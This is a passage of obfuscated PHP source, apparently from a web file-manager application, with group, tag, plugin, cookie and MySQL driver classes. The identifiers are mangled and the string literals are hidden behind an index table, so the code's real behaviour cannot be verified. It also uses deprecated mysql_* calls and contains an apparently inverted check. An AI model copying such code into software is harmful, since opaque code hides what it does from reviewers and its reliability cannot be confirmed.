array_reverse($ÇÎÏ“ø)) . $ üñ¡·[50]; $this->setNamePinyin($„Å¦†ÈÕ[$¡ıöø¼ ], $„Å¦†ÈÕ[$ üñ¡·[32]]); $this->where(array($¡ıöø¼  => $„Å¦†ÈÕ[$¡ıöø¼ ]))->save(array($ üñ¡·[657] => $ÇÎÏ“ø)); } return $Ã®¨ƒ; } public function groupNameAuto($›Ï®îİ€, $’Öç µ) { $·¹èîù =& $_SERVER[¶Ô„œ…¯]; $¢ë¶Ò‹² = $this->where(array($·¹èîù[479] => $›Ï®îİ€))->getField($·¹èîù[32], !0); if (!$¢ë¶Ò‹² || !in_array($’Öç µ, $¢ë¶Ò‹²)) { return $’Öç µ; } for ($´ò¥Ë½ = 1; $´ò¥Ë½ <= count($¢ë¶Ò‹²) + 1; $´ò¥Ë½++) { $îš¬ úØ = $’Öç µ . "\50{$´ò¥Ë½}\51"; if (!in_array($îš¬ úØ, $¢ë¶Ò‹²)) { return $îš¬ úØ; } } } public function groupSwitch($‹µà²ù, $»­Ÿ’•) { $¼Çúâ¡Ê =& $_SERVER[¶Ô„œ…¯]; $óª¶ôİ÷ = array($¼Çúâ¡Ê[1980] => array($¼Çúâ¡Ê[7], array($‹µà²ù, $»­Ÿ’•))); $ôßüÄÏ× = $this->where($óª¶ôİ÷)->select(); $ôßüÄÏ× = array_to_keyvalue($ôßüÄÏ×, $¼Çúâ¡Ê[1980]); if (!isset($ôßüÄÏ×[$‹µà²ù]) || !isset($ôßüÄÏ×[$»­Ÿ’•]) || $ôßüÄÏ×[$‹µà²ù][$¼Çúâ¡Ê[192]] == 0) { return !1; } $óª¶ôİ÷ = array($¼Çúâ¡Ê[1980] => $‹µà²ù); $‰§®Á”Ä = Model($¼Çúâ¡Ê[2074])->where($óª¶ôİ÷)->select(); if (!$‰§®Á”Ä) { $‰§®Á”Ä = array(); } foreach ($‰§®Á”Ä as $À¯¬µòâ) { $¢ªªù£á = $À¯¬µòâ[$¼Çúâ¡Ê[1780]]; $óª¶ôİ÷ = array($¼Çúâ¡Ê[1780] => $¢ªªù£á, $¼Çúâ¡Ê[1980] => $»­Ÿ’•); $ÜÇé‘”Ş = Model($¼Çúâ¡Ê[2074])->where($óª¶ôİ÷)->find(); if (!$ÜÇé‘”Ş) { $ãü’¡Œ± = array($»­Ÿ’• => $À¯¬µòâ[$¼Çúâ¡Ê[2088]]); Model($¼Çúâ¡Ê[599])->userGroupAdd($¢ªªù£á, $ãü’¡Œ±); } Model($¼Çúâ¡Ê[599])->userGroupRemove($¢ªªù£á, $‹µà²ù); } $óª¶ôİ÷ = array($¼Çúâ¡Ê[190] => 2, $¼Çúâ¡Ê[192] => 0, $¼Çúâ¡Ê[487] => 1, $¼Çúâ¡Ê[571] => array($¼Çúâ¡Ê[7], array($‹µà²ù, $»­Ÿ’•))); $¥Âûº²ş = Model($¼Çúâ¡Ê[903])->where($óª¶ôİ÷)->field($¼Çúâ¡Ê[2089])->select(); $¥Âûº²ş = array_to_keyvalue($¥Âûº²ş, $¼Çúâ¡Ê[571], $¼Çúâ¡Ê[193]); $î™¤şÃ¼ = !empty($¥Âûº²ş[$‹µà²ù]) ? $¥Âûº²ş[$‹µà²ù] : !1; if ($î™¤şÃ¼) { if (!$¥Âûº²ş[$»­Ÿ’•]) { $¥Âûº²ş[$»­Ÿ’•] = Model($¼Çúâ¡Ê[903])->groupRootAdd($»­Ÿ’•); } $Ô„×é±× = $¥Âûº²ş[$»­Ÿ’•]; $óª¶ôİ÷ = array($¼Çúâ¡Ê[192] => $î™¤şÃ¼); $¥Âûº²ş = Model($¼Çúâ¡Ê[903])->where($óª¶ôİ÷)->field($¼Çúâ¡Ê[2090])->select(); if (!$¥Âûº²ş) { $¥Âûº²ş = array(); } Model($¼Çúâ¡Ê[903])->moveClearAuth = !1; foreach ($¥Âûº²ş as $¿ŒÍ“ı) { $°ô®Éæ¤ = $¿ŒÍ“ı[$¼Çúâ¡Ê[487]] == $¼Çúâ¡Ê[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¼Çúâ¡Ê[903])->move($¿ŒÍ“ı[$¼Çúâ¡Ê[193]], $Ô„×é±×, $°ô®Éæ¤); } Model($¼Çúâ¡Ê[903])->moveClearAuth = !0; $óª¶ôİ÷ = array($¼Çúâ¡Ê[190] => 2, $¼Çúâ¡Ê[571] => $‹µà²ù); $§ŸÙ™°š = array($¼Çúâ¡Ê[571] => $»­Ÿ’•); Model($¼Çúâ¡Ê[2091])->where($óª¶ôİ÷)->save($§ŸÙ™°š); Model($¼Çúâ¡Ê[2092])->where($óª¶ôİ÷)->save($§ŸÙ™°š); } $this->_changeChildLevel($ôßüÄÏ×[$‹µà²ù], $ôßüÄÏ×[$»­Ÿ’•], !0); $this->where(array($¼Çúâ¡Ê[192] => $‹µà²ù))->save(array($¼Çúâ¡Ê[192] => $»­Ÿ’•)); $this->_clearChildrenCache($ôßüÄÏ×[$»­Ÿ’•]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\146\x61\x76"; protected function cacheFunctionAlias($ÆÜüÅË) { $‹§óî =& $_SERVER[¶Ô„œ…¯]; return array($‹§óî[2093] => array($ÆÜüÅË[0], $‹§óî[2094]), $‹§óî[2095] => array($ÆÜüÅË[0], $‹§óî[2096])); } protected function get($ÀÒàáî¤) { $©Ï¶ûªÃ =& $_SERVER[¶Ô„œ…¯]; $¶“÷ÅÅ¦ = Model($©Ï¶ûªÃ[587])->metaGet($ÀÒàáî¤, $©Ï¶ûªÃ[2097]); $‰†™²æ´ = json_decode($¶“÷ÅÅ¦, !0); return $‰†™²æ´ ? $‰†™²æ´ : array($©Ï¶ûªÃ[2098] => $©Ï¶ûªÃ[91], $©Ï¶ûªÃ[447] => array()); } protected function set($™ó¸ÜÈ, $ñû¥­Í¶) { $®®Èå¾« =& $_SERVER[¶Ô„œ…¯]; $ñû¥­Í¶ = $ñû¥­Í¶ ? $ñû¥­Í¶ : array($®®Èå¾«[2098] => $®®Èå¾«[91], $®®Èå¾«[447] => array()); return Model($®®Èå¾«[587])->metaSet($™ó¸ÜÈ, $®®Èå¾«[2097], json_encode($ñû¥­Í¶)); } protected function getByTagID($³ğ’§€í, $Ûˆıì›) { $»§Æ˜úà =& $_SERVER[¶Ô„œ…¯]; if (!$³ğ’§€í || !$Ûˆıì›) { return !1; } if (!Model($»§Æ˜úà[587])->getInfoSimple($³ğ’§€í)) { return !1; } $¿ÛˆÆÑ— = $this->get($³ğ’§€í); if (!$¿ÛˆÆÑ— || !isset($¿ÛˆÆÑ—[$»§Æ˜úà[447]])) { return !1; } $œÈëÜøº = array_find_by_field($¿ÛˆÆÑ—[$»§Æ˜úà[447]], $»§Æ˜úà[477], $Ûˆıì›); return is_array($œÈëÜøº) ? $œÈëÜøº : !1; } public function listSource($¯úùÊòÅ, $í‘£ğÔ) { $ÁœĞŒ¤ =& $_SERVER[¶Ô„œ…¯]; if ($í‘£ğÔ && !is_array($í‘£ğÔ)) { $í‘£ğÔ = array($í‘£ğÔ); } $—€¼±Åì = $this->listData($¯úùÊòÅ); $ÛÉÅâş÷ = array(); foreach ($—€¼±Åì as $éòİ¥İ›) { $Ó·²šø = $éòİ¥İ›[$ÁœĞŒ¤[87]]; if (!$Ó·²šø) { continue; } if (!isset($ÛÉÅâş÷[$Ó·²šø])) { $ÛÉÅâş÷[$Ó·²šø] = array(); } $ÛÉÅâş÷[$Ó·²šø][] = $éòİ¥İ›[$ÁœĞŒ¤[502]]; } $€¿´Å‹± = array(); foreach ($ÛÉÅâş÷ as $úéœ¸ª => $Ğ¬×Ê„‚) { $Àëµ¢‚š = !0; if (!$í‘£ğÔ) { $€¿´Å‹±[] = $úéœ¸ª; continue; } foreach ($í‘£ğÔ as $óğÁ†ó÷) { if (!in_array($óğÁ†ó÷, $Ğ¬×Ê„‚)) { $Àëµ¢‚š = !1; break; } } if ($Àëµ¢‚š) { $€¿´Å‹±[] = $úéœ¸ª; } } if (!$€¿´Å‹±) { return array(); } $÷É‹Ôú’ = array($ÁœĞŒ¤[493] => array($ÁœĞŒ¤[494], $€¿´Å‹±), $ÁœĞŒ¤[571] => $¯úùÊòÅ, $ÁœĞŒ¤[190] => SourceModel::TYPE_GROUP); $˜ñ­³†ó = Model($ÁœĞŒ¤[1428])->listSource($÷É‹Ôú’); if (!$˜ñ­³†ó || count($€¿´Å‹±) == $˜ñ­³†ó[$ÁœĞŒ¤[444]][$ÁœĞŒ¤[445]]) { return $˜ñ­³†ó; } $ıùû–Ûğ = array(); $Ê‹ÛÄ·ê = array_to_keyvalue($˜ñ­³†ó[$ÁœĞŒ¤[85]], $ÁœĞŒ¤[12], $ÁœĞŒ¤[193]); $ô×éÊß´ = array_to_keyvalue($˜ñ­³†ó[$ÁœĞŒ¤[86]], $ÁœĞŒ¤[12], $ÁœĞŒ¤[193]); $º´ˆƒÙ˜ = array_merge($ô×éÊß´, $Ê‹ÛÄ·ê); foreach ($€¿´Å‹± as $Ó·²šø) { if (!in_array($Ó·²šø, $º´ˆƒÙ˜)) { $ıùû–Ûğ[] = $Ó·²šø; } } if ($ıùû–Ûğ) { $this->removeBySource($¯úùÊòÅ, $ıùû–Ûğ); } return $˜ñ­³†ó; } protected function listData($çß¨–õ) { $Å¨—Óáş =& $_SERVER[¶Ô„œ…¯]; $–ù³»áŒ = array($Å¨—Óáş[1771] => 0, $Å¨—Óáş[559] => array($Å¨—Óáş[2099], 0), $Å¨—Óáş[498] => $Å¨—Óáş[2100] . $çß¨–õ); $¤­¨¬‡Ü = $Å¨—Óáş[2101]; $ªåïŸå = $this->field($¤­¨¬‡Ü)->where($–ù³»áŒ)->order($Å¨—Óáş[2102])->select(); return $ªåïŸå ? $ªåïŸå : array(); } protected function addToTag($âãôÌ”×, $ıóÔÉ, $äŞ°“á˜) { $À¢ö =& $_SERVER[¶Ô„œ…¯]; if (!$this->getByTagID($âãôÌ”×, $äŞ°“á˜) || !$ıóÔÉ) { return !1; } if (!Model($À¢ö[903])->pathInfo($ıóÔÉ)) { return !1; } $±¿¡‚ğÈ = array($À¢ö[1771] => 0, $À¢ö[559] => $äŞ°“á˜, $À¢ö[497] => $ıóÔÉ, $À¢ö[498] => $À¢ö[2103] . $âãôÌ”×, $À¢ö[496] => $À¢ö[12], $À¢ö[1984] => 0); if ($this->where($±¿¡‚ğÈ)->find()) { return !1; } return $this->add($±¿¡‚ğÈ); } protected function removeFromTag($ñß¢Ä²ş, $Ú½‘œ¾Œ, $õç¦ë†) { $¶âµÁé¬ =& $_SERVER[¶Ô„œ…¯]; if (!$this->getByTagID($ñß¢Ä²ş, $õç¦ë†) || !$Ú½‘œ¾Œ) { return !1; } if (is_array($Ú½‘œ¾Œ)) { $Ú½‘œ¾Œ = array($¶âµÁé¬[7], $Ú½‘œ¾Œ); } $îúÑ“£™ = array($¶âµÁé¬[1771] => 0, $¶âµÁé¬[559] => $õç¦ë†, $¶âµÁé¬[498] => $¶âµÁé¬[2103] . $ñß¢Ä²ş, $¶âµÁé¬[497] => $Ú½‘œ¾Œ); return $this->where($îúÑ“£™)->delete(); } protected function removeByTag($ÛÛúıœĞ, $Ê³Ä•ŸÉ) { $ä„£ë±ş =& $_SERVER[¶Ô„œ…¯]; if (!$this->getByTagID($ÛÛúıœĞ, $Ê³Ä•ŸÉ)) { return !1; } $öçëĞ‚¨ = array($ä„£ë±ş[1771] => 0, $ä„£ë±ş[559] => $Ê³Ä•ŸÉ, $ä„£ë±ş[498] => $ä„£ë±ş[2103] . $ÛÛúıœĞ); return $this->where($öçëĞ‚¨)->delete(); } protected function removeBySource($ñİ´ãØÃ, $ù¾ö¬†) { $™Ş¿ë¤ =& $_SERVER[¶Ô„œ…¯]; if (!$ñİ´ãØÃ || !$ù¾ö¬†) { return !1; } if (is_array($ù¾ö¬†)) { $ù¾ö¬† = array($™Ş¿ë¤[7], $ù¾ö¬†); } $şÓ¾âÏŠ = array($™Ş¿ë¤[1771] => 0, $™Ş¿ë¤[497] => $ù¾ö¬†, $™Ş¿ë¤[559] => array($™Ş¿ë¤[1098], 0), $™Ş¿ë¤[498] => $™Ş¿ë¤[2103] . $ñİ´ãØÃ); return $this->where($şÓ¾âÏŠ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\x2e\x70\x6c\x75\147\151\156\114\x69\163\x74"; public $field = array("\x6e\x61\x6d\145", "\163\x74\x61\164\165\163", "\x72\x65\147\151\x65\163\x74", "\x63\157\x6e\146\151\x67"); public function loadList($ÚÇõı¨ê = false) { $½ÙıŠ¶Ë = array_to_keyvalue($this->listData(), $_SERVER[¶Ô„œ…¯][32]); if ($ÚÇõı¨ê) { return $½ÙıŠ¶Ë[$ÚÇõı¨ê]; } return $½ÙıŠ¶Ë; } public function init() { $Àš®ÁÍØ =& $_SERVER[¶Ô„œ…¯]; Hook::trigger($Àš®ÁÍØ[2104]); $ã‘ßõÊ± = $this->loadPluginList(); foreach ($ã‘ßõÊ± as $¾©—÷Âô => $¥ÑÁÏ‡º) { $’ë¢¼ğƒ = $this->appAllow($¾©—÷Âô, $¥ÑÁÏ‡º); if (!$’ë¢¼ğƒ) { continue; } foreach ($¥ÑÁÏ‡º[$Àš®ÁÍØ[2105]] as $×¨Ş¾Â => $³°ŠÒúæ) { Hook::bind($×¨Ş¾Â, $³°ŠÒúæ); } } Hook::trigger($Àš®ÁÍØ[2106]); Hook::trigger(ACTION); } public function appAllow($¿Ú¬Õ´´, $§Šïí¢, $èª¾æÖÜ = true) { $Ûº°Š¨ =& $_SERVER[¶Ô„œ…¯]; $Öõ†µ´ = PLUGIN_DIR . $¿Ú¬Õ´´ . $Ûº°Š¨[2107]; if (!is_array($§Šïí¢) || !is_array($§Šïí¢[$Ûº°Š¨[2105]]) || $§Šïí¢[$Ûº°Š¨[828]] != 1 || !is_file($Öõ†µ´)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$Ûº°Š¨[6]][$Ûº°Š¨[2108]] || !$GLOBALS[$Ûº°Š¨[6]][$Ûº°Š¨[2109]]) { return !0; } $ŠËó¹Éâ = explode($Ûº°Š¨[50], strtolower($GLOBALS[$Ûº°Š¨[6]][$Ûº°Š¨[2109]])); return in_array(strtolower($¿Ú¬Õ´´), $ŠËó¹Éâ) ? !1 : !0; } if ($èª¾æÖÜ && !Action($Ûº°Š¨[2110])->checkAuth($¿Ú¬Õ´´)) { return !1; } return !0; } public function unInstall($¦äÙØ’§) { $ºïƒå¼ =& $_SERVER[¶Ô„œ…¯]; $´˜×ŠËë = $this->loadList($¦äÙØ’§); if (file_exists(PLUGIN_DIR . $¦äÙØ’§)) { Hook::apply($¦äÙØ’§ . $ºïƒå¼[2111]); } $this->remove($´˜×ŠËë[$ºïƒå¼[477]]); } public function changeStatus($á È‰õØ, $±¹Âö“Ä) { $´Î«¥‰š =& $_SERVER[¶Ô„œ…¯]; $ª¹½ÀÎÛ = $this->loadList($á È‰õØ); if ($±¹Âö“Ä) { Hook::apply($á È‰õØ . $´Î«¥‰š[2112]); } $this->update($ª¹½ÀÎÛ[$´Î«¥‰š[477]], array($´Î«¥‰š[2113] => $±¹Âö“Ä)); } public function appRegist($•±µÆ†Í, $²İùÇß) { $ÒÖ“ªã³ =& $_SERVER[¶Ô„œ…¯]; $ğĞİ˜™¹ = $this->loadList($•±µÆ†Í); if ($ğĞİ˜™¹) { $this->update($ğĞİ˜™¹[$ÒÖ“ªã³[477]], array($ÒÖ“ªã³[2105] => $²İùÇß)); } else { $ÃºÛöº¹ = array($ÒÖ“ªã³[32] => $•±µÆ†Í, $ÒÖ“ªã³[2105] => $²İùÇß, $ÒÖ“ªã³[828] => 0, $ÒÖ“ªã³[6] => $this->getConfigDefault($•±µÆ†Í)); $this->insert($ÃºÛöº¹); } } public function getConfigDefault($ğÑÄØ‰•) { $îœ„£— =& $_SERVER[¶Ô„œ…¯]; $ËäÄé­Ä = array(); $ïìšõñ§ = $this->getPackageJson($ğÑÄØ‰•); if (!$ïìšõñ§ && is_array($ïìšõñ§[$îœ„£—[2114]])) { return $ËäÄé­Ä; } foreach ($ïìšõñ§[$îœ„£—[2114]] as $ÓÒœö¬× => $ğ¼Ã§Ôõ) { if (!isset($ğ¼Ã§Ôõ[$îœ„£—[452]]) || isset($ËäÄé­Ä[$ÓÒœö¬×])) { continue; } $ËäÄé­Ä[$ÓÒœö¬×] = $ğ¼Ã§Ôõ[$îœ„£—[452]]; } return $ËäÄé­Ä; } public function getPackageJson($ÂŒºà¹ã) { return Hook::apply($ÂŒºà¹ã . $_SERVER[¶Ô„œ…¯][2115]); } public function getConfig($çÊ”®¡×, $ Æ•¯Ë¥ = false) { $ŒÇ»ªÎ =& $_SERVER[¶Ô„œ…¯]; $³ğß£Á¢ = array(); $æğÛË§ = $this->loadList($çÊ”®¡×); if ($æğÛË§ && is_array($æğÛË§[$ŒÇ»ªÎ[6]])) { $³ğß£Á¢ = $æğÛË§[$ŒÇ»ªÎ[6]]; } if (!$³ğß£Á¢ || $ Æ•¯Ë¥) { $³ğß£Á¢ = $this->getConfigDefault($çÊ”®¡×); } return $³ğß£Á¢; } public function setConfig($Ç³âËßÑ, $…º™Ğı = false) { $‚…Ú’” =& $_SERVER[¶Ô„œ…¯]; $Ë‰¿áÊ– = $this->loadList($Ç³âËßÑ); if (!$Ë‰¿áÊ–) { return !1; } $‘Ùæã¦÷ = $Ë‰¿áÊ–[$‚…Ú’”[6]]; if ($…º™Ğı == !1) { $‘Ùæã¦÷ = array(); $…º™Ğı = $this->getConfigDefault($Ç³âËßÑ); } foreach ($…º™Ğı as $”Ó¶ûè => $©§“Ûûô) { $‘Ùæã¦÷[$”Ó¶ûè] = is_string($©§“Ûûô) ? trim($©§“Ûûô) : $©§“Ûûô; } $this->update($Ë‰¿áÊ–[$‚…Ú’”[477]], array($‚…Ú’”[6] => $‘Ùæã¦÷)); } public function viewList() { $­§îù¹– =& $_SERVER[¶Ô„œ…¯]; $¸™ˆı¦ğ = $this->loadList(); $this->pluginScan($¸™ˆı¦ğ); $¸™ˆı¦ğ = $this->loadPluginList(); $«İö±±‚ = array(); foreach ($¸™ˆı¦ğ as $öÏúˆ¡Û => $Ü–íúÄÛ) { $¯”à‹Ù = $Ü–íúÄÛ; unset($Ü–íúÄÛ[$­§îù¹–[2105]], $Ü–íúÄÛ[$­§îù¹–[6]]); $õÁÜãæ‰ = PLUGIN_DIR . $Ü–íúÄÛ[$­§îù¹–[32]] . $­§îù¹–[2107]; if (!is_file($õÁÜãæ‰)) { continue; } $Êœ¼¾ˆØ = Hook::apply($Ü–íúÄÛ[$­§îù¹–[32]] . $­§îù¹–[2115]); if (!is_array($Êœ¼¾ˆØ)) { continue; } $«İö±±‚[$öÏúˆ¡Û] = array_merge($Ü–íúÄÛ, $Êœ¼¾ˆØ); if ($¯”à‹Ù[$­§îù¹–[6]][$­§îù¹–[1691]] != $Êœ¼¾ˆØ[$­§îù¹–[1665]]) { Hook::apply($Ü–íúÄÛ[$­§îù¹–[32]] . $­§îù¹–[2112]); $¯”à‹Ù[$­§îù¹–[6]][$­§îù¹–[1691]] = $Êœ¼¾ˆØ[$­§îù¹–[1665]]; $this->update($Ü–íúÄÛ[$­§îù¹–[477]], array($­§îù¹–[6] => $¯”à‹Ù[$­§îù¹–[6]])); } } return $«İö±±‚; } private function loadPluginList() { $£‚¨³ƒä =& $_SERVER[¶Ô„œ…¯]; $®¨÷¬ª = $this->loadList(); if (strtolower(MOD) == $£‚¨³ƒä[2116]) { return $®¨÷¬ª; } $Õ ºùÙì = Hook::trigger($£‚¨³ƒä[2117], $®¨÷¬ª); if ($®¨÷¬ª && !$Õ ºùÙì) { die; } return $Õ ºùÙì ? $Õ ºùÙì : $®¨÷¬ª; } private function pluginScan($òŒêˆÎË) { $Ù¢¯ö½† =& $_SERVER[¶Ô„œ…¯]; recursion_dir(PLUGIN_DIR, $Óö½€¨Ô, $°Â‡ù£“, 0); foreach ($Óö½€¨Ô as $éşíÑÉå) { $¼ë±úœ = get_path_this($éşíÑÉå); if (isset($òŒêˆÎË[$¼ë±úœ]) || !file_exists($éşíÑÉå . $Ù¢¯ö½†[2118]) || !file_exists($éşíÑÉå . $Ù¢¯ö½†[2107])) { continue; } Hook::apply($¼ë±úœ . $Ù¢¯ö½†[2112]); } } } goto A¦åİ¿Ùä; aÛÀÉˆÈâ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($Ÿ³Û’ğ = '', $¬œëùÍÆ = 0) { if (is_string($Ÿ³Û’ğ) && $Ÿ³Û’ğ != $_SERVER[¶Ô„œ…¯][12]) { $this->prefix = $Ÿ³Û’ğ; } if (is_numeric($¬œëùÍÆ) && $¬œëùÍÆ > 0) { $this->expire = $¬œëùÍÆ; } } public static function getInstance() { static $ÀÉÂêğ; if ($ÀÉÂêğ === null) { $ÀÉÂêğ = new self(); } return $ÀÉÂêğ; } private static $cookieDisable = false; public static function disable($ÂÅÔÍ†á) { self::$cookieDisable = $ÂÅÔÍ†á; } private static $sameCookieSet = array(); public static function set($‡Ç£øŒ, $¡Åºº•, $ıÁêÄ·Ó = 0, $„ÀÜËÂõ = false, $ï‘„æÉß = false) { $¡æ÷Ì”Ä =& $_SERVER[¶Ô„œ…¯]; if (self::$cookieDisable) { return; } if (!$ıÁêÄ·Ó) { $ıÁêÄ·Ó = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$‡Ç£øŒ]) && self::$sameCookieSet[$‡Ç£øŒ] == $¡Åºº• . $ıÁêÄ·Ó) { return; } self::$sameCookieSet[$‡Ç£øŒ] = $¡Åºº• . $ıÁêÄ·Ó; if (!$ï‘„æÉß) { $ï‘„æÉß = str_replace(HOST, $¡æ÷Ì”Ä[12], APP_HOST); $ï‘„æÉß = _get($GLOBALS, $¡æ÷Ì”Ä[967], $ï‘„æÉß); } $ƒÙŠ¨…™ = $¡æ÷Ì”Ä[12]; setcookie($‡Ç£øŒ, $¡Åºº•, time() + $ıÁêÄ·Ó, $¡æ÷Ì”Ä[8] . trim($ï‘„æÉß, $¡æ÷Ì”Ä[8]) . $ƒÙŠ¨…™, !1, !1, $„ÀÜËÂõ); } public static function setSafe($Á¨ÓÊ½Ò, $ÈîÜÃì, $´ê±Á¼ø = 0) { self::set($Á¨ÓÊ½Ò, $ÈîÜÃì, $´ê±Á¼ø, !0); } public static function get($‘Ü½¾‚) { static $‚¤áäÈ» = false; if (!$‚¤áäÈ») { self::initHeaderCookie(); $‚¤áäÈ» = !0; } return isset($_COOKIE[$‘Ü½¾‚]) ? $_COOKIE[$‘Ü½¾‚] : !1; } private static function initHeaderCookie() { $Ø¾ŸÉÜ– =& $_SERVER[¶Ô„œ…¯]; if (!isset($_SERVER[$Ø¾ŸÉÜ–[968]]) || !$_SERVER[$Ø¾ŸÉÜ–[968]]) { return; } $Æ­Áü‡‹ = explode($Ø¾ŸÉÜ–[74], $_SERVER[$Ø¾ŸÉÜ–[968]]); foreach ($Æ­Áü‡‹ as $ãà™à“Ò) { $ãà™à“Ò = explode($Ø¾ŸÉÜ–[508], $ãà™à“Ò); if (count($ãà™à“Ò) != 2 || !isset($ãà™à“Ò[1])) { continue; } $_COOKIE[trim($ãà™à“Ò[0])] = trim($ãà™à“Ò[1]); } } public static function remove($ŠÖ¾õ¬ü, $Àè²”˜Ê = false) { unset($_COOKIE[$ŠÖ¾õ¬ü]); self::set($ŠÖ¾õ¬ü, $_SERVER[¶Ô„œ…¯][12], 1, $Àè²”˜Ê); } } class DbMysql extends Db { public function __construct($şÁÉ¢ôç = '') { $ıƒÔ¨’ =& $_SERVER[¶Ô„œ…¯]; if (!extension_loaded($ıƒÔ¨’[883])) { think_exception(think_lang($ıƒÔ¨’[14]) . $ıƒÔ¨’[969]); } if (!empty($şÁÉ¢ôç)) { $this->config = $şÁÉ¢ôç; if (empty($this->config[$ıƒÔ¨’[17]])) { $this->config[$ıƒÔ¨’[17]] = $ıƒÔ¨’[12]; } } } public function connect($öµË¦¸£ = '', $­æËœÜ = 0, $¼œÔ™ïÃ = false) { $½ïƒØ˜Í =& $_SERVER[¶Ô„œ…¯]; if (!isset($this->linkID[$­æËœÜ])) { if (empty($öµË¦¸£)) { $öµË¦¸£ = $this->config; } $İÃ¬µñİ = $öµË¦¸£[$½ïƒØ˜Í[970]] . ($öµË¦¸£[$½ïƒØ˜Í[971]] ? "\72{$öµË¦¸£[$½ïƒØ˜Í[971]]}" : $½ïƒØ˜Í[12]); $Ü§ôå“š = !empty($öµË¦¸£[$½ïƒØ˜Í[17]][$½ïƒØ˜Í[18]]) ? $öµË¦¸£[$½ïƒØ˜Í[17]][$½ïƒØ˜Í[18]] : $this->pconnect; if ($Ü§ôå“š) { $this->linkID[$­æËœÜ] = mysql_pconnect($İÃ¬µñİ, $öµË¦¸£[$½ïƒØ˜Í[972]], $öµË¦¸£[$½ïƒØ˜Í[973]], 131072); } else { $this->linkID[$­æËœÜ] = mysql_connect($İÃ¬µñİ, $öµË¦¸£[$½ïƒØ˜Í[972]], $öµË¦¸£[$½ïƒØ˜Í[973]], !0, 131072); } if (!$this->linkID[$­æËœÜ] || !empty($öµË¦¸£[$½ïƒØ˜Í[21]]) && !mysql_select_db($öµË¦¸£[$½ïƒØ˜Í[21]], $this->linkID[$­æËœÜ])) { think_exception(mysql_error()); } $õÇË†½ø = mysql_get_server_info($this->linkID[$­æËœÜ]); mysql_query($½ïƒØ˜Í[974] . think_config($½ïƒØ˜Í[975]) . $½ïƒØ˜Í[58], $this->linkID[$­æËœÜ]); if ($õÇË†½ø > $½ïƒØ˜Í[976]) { mysql_query($½ïƒØ˜Í[977], $this->linkID[$­æËœÜ]); } $this->connected = !0; if (1 != think_config($½ïƒØ˜Í[22])) { unset($this->config); } } return $this->linkID[$­æËœÜ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($¥È®†™„) { $À–¬çöÖ =& $_SERVER[¶Ô„œ…¯]; if (0 === stripos($¥È®†™„, $À–¬çöÖ[343])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¥È®†™„; if ($this->queryID) { $this->free(); } think_action_status($À–¬çöÖ[23], 1); think_status($À–¬çöÖ[24]); $this->queryID = mysql_query($¥È®†™„, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($Ëôôç˜µ) { $öº®¼ÖÕ =& $_SERVER[¶Ô„œ…¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ëôôç˜µ; if ($this->queryID) { $this->free(); } think_action_status($öº®¼ÖÕ[25], 1); think_status($öº®¼ÖÕ[24]); $ñÏ·áä = mysql_query($Ëôôç˜µ, $this->_linkID); $this->debug(); if (!1 === $ñÏ·áä) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¶Ô„œ…¯][978], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¼‘¿¢÷­ = mysql_query($_SERVER[¶Ô„œ…¯][979], $this->_linkID); $this->transTimes = 0; if (!$¼‘¿¢÷­) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¾Ü§‹·÷ = mysql_query($_SERVER[¶Ô„œ…¯][980], $this->_linkID); $this->transTimes = 0; if (!$¾Ü§‹·÷) { $this->error(); return !1; } } return !0; } private function getAll() { $²ı•¸¶Ã = array(); if ($this->numRows > 0) { while ($Ö‰öØãÄ = mysql_fetch_assoc($this->queryID)) { $²ı•¸¶Ã[] = $Ö‰öØãÄ; } mysql_data_seek($this->queryID, 0); } return $²ı•¸¶Ã; } public function getFields($©¡ÏåÒÔ) { $‡¥ìÎı¯ =& $_SERVER[¶Ô„œ…¯]; $™ãòïÈÎ = $this->query($‡¥ìÎı¯[981] . $this->parseKey($©¡ÏåÒÔ)); $‡ÎÍÊ›ª = array(); if ($™ãòïÈÎ) { foreach ($™ãòïÈÎ as $ÅàÀåğ¤ => $ÄÚúĞ¹å) { $‡ÎÍÊ›ª[$ÄÚúĞ¹å[$‡¥ìÎı¯[31]]] = array($‡¥ìÎı¯[32] => $ÄÚúĞ¹å[$‡¥ìÎı¯[31]], $‡¥ìÎı¯[33] => $ÄÚúĞ¹å[$‡¥ìÎı¯[34]], $‡¥ìÎı¯[35] => (bool) (strtoupper($ÄÚúĞ¹å[$‡¥ìÎı¯[36]]) === $‡¥ìÎı¯[982]), $‡¥ìÎı¯[37] => $ÄÚúĞ¹å[$‡¥ìÎı¯[38]], $‡¥ìÎı¯[39] => strtolower($ÄÚúĞ¹å[$‡¥ìÎı¯[40]]) == $‡¥ìÎı¯[41], $‡¥ìÎı¯[42] => strtolower($ÄÚúĞ¹å[$‡¥ìÎı¯[43]]) == $‡¥ìÎı¯[44]); } } return $‡ÎÍÊ›ª; } public function getTables($œ‘Àâ¨  = '') { $¤¿ûòçş =& $_SERVER[¶Ô„œ…¯]; if (!empty($œ‘Àâ¨ )) { $×°ú¦ò‚ = $¤¿ûòçş[983] . $œ‘Àâ¨  . $¤¿ûòçş[984]; } else { $×°ú¦ò‚ = $¤¿ûòçş[985]; } $ï¤„•¬ = $this->query($×°ú¦ò‚); $¬­–ğ•ù = array(); foreach ($ï¤„•¬ as $¤ëÁğíƒ => $ŠÇŞ˜°„) { $¬­–ğ•ù[$¤ëÁğíƒ] = current($ŠÇŞ˜°„); } return $¬­–ğ•ù; } 